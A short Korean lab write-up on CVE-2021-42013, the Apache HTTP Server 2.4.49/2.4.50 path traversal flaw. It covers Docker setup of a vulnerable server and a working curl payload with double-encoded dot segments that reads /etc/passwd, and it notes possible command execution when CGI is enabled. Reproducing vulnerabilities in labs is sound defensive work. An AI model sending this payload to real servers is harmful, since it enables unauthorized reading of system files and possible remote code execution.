Apache HTTP Server 2.4.50의 경로 탐색 및 파일 노출 취약점 (CVE-2021-42013)
=
**Contributors**
* [박희진(@gmlwlsdl)](https://github.com/gmlwlsdl)
<br/>

### 요약
* Apache HTTP Server Project는 UNIX 및 Windows를 포함한 최신 운영 체제를 위한 오픈 소스 HTTP 서버를 개발하고 유지 관리하기 위한 소프트웨어입니다.
* CVE-2021-42013은 CVE-2021-41773의 불완전한 수정으로 인해 발생하는 취약점 입니다.
* 이 취약점은 이전 버전이 아닌 Apache HTTP Server 2.4.49 및 2.4.50에 영향을 미칩니다.
<br/>

### 환경 구성 및 실행
* 다음 명령을 실행하여 취약한 Apache HTTP 서버를 시작합니다

        docker compose build
        docker compose up -d

* 서버가 시작된 후  ```http://your-ip:8080```를 통해 Apache HTTP Server의 It works!라는 기본 페이지를 볼 수 있습니다.
* Apache HTTP Server 2.4.50은 ```http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd```와 같은 이전 CVE-2021-41773 페이로드를 패치했지만 불완전 합니다.
* ```.%%32%65```를 사용하여 패치를 우회합니다. (```/icons/```는 존재하는 디렉토리여야 함)
  
        curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd

![Alt text](./httpd/CVE-2021-42013/1.png)
* 서버에서 mods cgi 또는 cgid가 활성화된 경우, 경로 탐색 취약점으로 인해 임의 명령이 실행될 수 있습니다.
<br/>

### 결과
![Alt text](./httpd/CVE-2021-42013/2.png)
<br/>

### 정리
* 공격자는 경로 순회 공격을 사용하여 URL을 구성된 디렉토리 외부의 파일에 매핑할 수 있습니다.
<br/>

### 참고
* https://httpd.apache.org/security/vulnerabilities_24.html
* https://twitter.com/roman_soft/status/1446252280597078024
